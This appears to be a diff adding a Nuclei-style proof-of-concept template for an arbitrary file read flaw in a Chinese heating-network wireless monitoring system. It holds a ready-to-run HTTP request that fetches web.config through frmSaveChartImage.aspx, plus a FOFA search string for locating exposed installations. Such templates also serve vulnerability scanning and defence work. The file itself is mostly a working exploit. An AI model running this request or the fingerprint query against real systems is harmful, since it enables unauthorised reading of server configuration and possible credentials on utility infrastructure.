@@ -1,0 +1,35 @@
+id: poc-abvdft72u4ewauow
+info:
+  name: 热网无线监测系统frmSaveChartImage存在任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/abvdft72u4ewauow'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: abvdft72u4ewauow
+    fofa: body="Downloads/HDPrintInstall.rar"
+http:
+- raw:
+  - 'GET /frmSaveChartImage.aspx?file=web.config HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Cookie: ASP.NET_SessionId=etxlbzrbmcecvsuy1fwjnfzy
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+    Accept-Encoding: gzip, deflate
+
+    Upgrade-Insecure-Requests: 1
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0) Gecko/20100101 Firefox/127.0
+
+    Priority: u=1
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
